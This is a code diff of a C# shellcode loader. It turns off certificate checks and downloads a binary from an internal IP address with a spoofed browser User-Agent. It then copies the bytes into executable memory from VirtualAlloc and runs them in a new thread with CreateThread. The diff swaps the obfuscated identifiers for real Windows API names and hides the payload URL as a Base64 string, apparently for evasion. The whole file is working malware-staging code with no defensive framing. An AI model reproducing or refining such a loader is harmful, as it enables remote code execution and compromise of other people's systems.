@@ -2,50 +2,55 @@ using System;
 using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Text;
 
 class Program
 {
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr a(IntPtr b, uint c, uint d, uint e);
+    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr f(IntPtr g, uint h, IntPtr i, IntPtr j, uint k, IntPtr l);
+    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern uint m(IntPtr n, uint o);
+    static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern bool p(IntPtr q, uint r, uint s);
+    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
 
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr t(string u);
+    static extern IntPtr GetModuleHandle(string lpModuleName);
 
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern IntPtr v(IntPtr w, string x);
+    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
     [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-    static extern uint y();
+    static extern uint GetLastError();
 
     static void Main()
     {
-        string z = "https://192.168.0.102/4.bin";
+        string encodedUrl = "aHR0cHM6Ly8xOTIuMTY4LjAuMTAyLzQuYmlu"; // URL codificada en Base64
 
-        ServicePointManager.ServerCertificateValidationCallback += (A, B, C, D) => true;
+        ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
 
-        using (WebClient E = new WebClient())
+        using (WebClient client = new WebClient())
         {
-            E.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
-            byte[] F = E.DownloadData(z);
+            client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
+                        
+            string url = Encoding.UTF8.GetString(Convert.FromBase64String(encodedUrl));
 
-            IntPtr G = a(IntPtr.Zero, (uint)F.Length, 0x1000, 0x40);
+            byte[] binData = client.DownloadData(url);
 
-            Marshal.Copy(F, 0, G, F.Length);
+            
+            IntPtr codePointer = VirtualAlloc(IntPtr.Zero, (uint)binData.Length, 0x1000, 0x40);
 
-            IntPtr H = f(IntPtr.Zero, 0, G, IntPtr.Zero, 0, IntPtr.Zero);
+            Marshal.Copy(binData, 0, codePointer, binData.Length);
 
-            m(H, 0xFFFFFFFF);
+            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, codePointer, IntPtr.Zero, 0, IntPtr.Zero);
 
-            p(G, 0, 0x8000);
+            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
+
+            VirtualFree(codePointer, 0, 0x8000);
         }
     }
 }
